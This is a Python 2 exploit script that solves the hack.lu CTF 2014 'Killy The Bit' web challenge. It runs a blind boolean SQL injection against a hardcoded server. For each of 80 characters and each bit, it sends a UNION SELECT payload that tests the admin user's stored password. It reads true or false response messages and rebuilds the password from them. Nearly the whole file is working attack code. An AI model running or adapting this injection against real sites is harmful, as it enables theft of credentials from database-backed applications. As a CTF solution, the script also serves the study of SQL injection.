#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# hack.lu CTF 2014) - Killy The Bit (Web 200)
# --------------------------------------------------------------------------------------------------
import socket
import time
import string
import httplib

# set packet data
method     = 'GET'
path       = '/index.php'
false_pat  = 'We couldn\'t find your username!'                             # statement is FALSE
true_pat   = 'A new password was generated and sent to your email address!' # statement is TRUE

# --------------------------------------------------------------------------------------------------
if __name__ == '__main__':

    pw_len = 80;                            # we assume that we know the data length
    pw     = '';                            # store the password here

    for i in range(1,pw_len+1):                 # for each character                
        
        char = ''                       # clear character
        for mask in [128,64,32,16,8,4,2,1]:         # for each bit

            payload  = "?name='+UNION+ALL+SELECT+name,email+FROM+user+WHERE+"
            payload +=  "ASCII(SUBSTR((SELECT+passwd+FROM+user+WHERE+name='admin'),"+str(i)+",1))>"
            payload += "(ASCII(SUBSTR((SELECT+passwd+FROM+user+WHERE+name='admin'),"+str(i)+",1))^"+str(mask)+")"
            payload += "--+&submit=Generate#"

            c = httplib.HTTPSConnection("149.13.33.84:1424")
            c.request(method, path+payload)
            response = c.getresponse()
            resp = response.read()

            if resp.find(true_pat)!=-1:
                # response is TRUE. The bit is 1                
                char = char + '1'
                print payload, '\t=> TRUE  => ', char
            else:
                # response is FALSE. The bit is 0
                char = char + '0'               
                print payload, '\t=> FALSE => ', char
            c.close()                   # close connection
            
        pw = pw + chr(int(char, 2))
        print 'Character Found: ', chr(int(char, 2)), '\tSo far: ', pw

    print 'Program finished... Password is: ', pw

# --------------------------------------------------------------------------------------------------
